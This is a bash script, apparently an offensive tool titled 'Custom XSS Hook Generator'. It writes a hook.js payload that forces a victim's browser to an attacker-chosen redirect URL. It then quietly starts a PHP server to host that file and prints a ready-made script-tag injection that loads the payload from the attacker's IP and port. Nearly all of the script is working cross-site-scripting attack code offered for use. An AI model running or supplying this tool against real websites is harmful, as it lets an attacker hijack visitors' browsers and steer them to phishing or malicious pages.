#!/bin/bash

# Colors
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
NC='\e[0m'

clear

# Banner
echo -e "${GREEN}==============================================${NC}"
echo -e "${YELLOW}      Custom XSS Hook Generator ${NC}"
echo -e "${GREEN}==============================================${NC}"

# Script directory
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

# Ask for port
# Prompt for port number with a default value
while true; do
    echo -ne "${BLUE}[?] Enter server port (example: 8080 ): ${NC}"
    read PORT
    PORT=${PORT:-8080}  # Set default port if empty
    if [[ "$PORT" =~ ^[0-9]+$ ]]; then
        break
    else
        echo "Invalid input. Please enter a valid numeric port number."
    fi
done

# Ask for redirect link
echo -ne "${BLUE}[?] Enter redirect URL (example: https://fb.com ): ${NC}"
read REDIRECT

# Extract domain
DOMAIN=$(echo "$REDIRECT" | awk -F[/:] '{print $4}')
HOOK_FILE="hook.js"

# Create hook file
cat > "$HOOK_FILE" <<EOF
(function(){
    const params = new URLSearchParams(window.location.search);
    const redirectUrl = params.get("redirect") || "$REDIRECT";
    if(redirectUrl){
        window.location.href = redirectUrl;
    } else {
        console.log("[${HOOK_FILE}] No redirect URL provided.");
    }
})();
EOF

# Auto IP fallback (Termux-safe)
[ -z "$IP" ] && IP="0.0.0.0"

# Start PHP server with FULL silence
php -S 0.0.0.0:"$PORT" >/dev/null 2>&1 &
SERVER_PID=$!

sleep 1

echo
echo -e "${GREEN}[+] PHP Server started on ${IP}:${PORT}${NC}"
echo -e "${BLUE}[+] Server PID: $SERVER_PID${NC}"
echo

# Hook in green
echo -e "${BLUE}Hook:${NC} ${GREEN}<script src=\"http://<IP>:${PORT}/${HOOK_FILE}\"></script>${NC}"

echo
echo -e "${BLUE}Example:${NC} ${GREEN}<script src=\"http://127.0.0.1:${PORT}/${HOOK_FILE}\"></script>${NC}"

echo
echo -e "${BLUE}hook file:${NC} ${GREEN}Saved at: ${SCRIPT_DIR}/${HOOK_FILE}${NC}"

echo
echo -e "${YELLOW}[i] Press CTRL+C to stop the server.${NC}"

# Trap CTRL+C
trap "echo; echo -e '${RED}[-] Server stopped${NC}'; kill $SERVER_PID 2>/dev/null; exit 0" INT

# Keep script alive
wait $SERVER_PID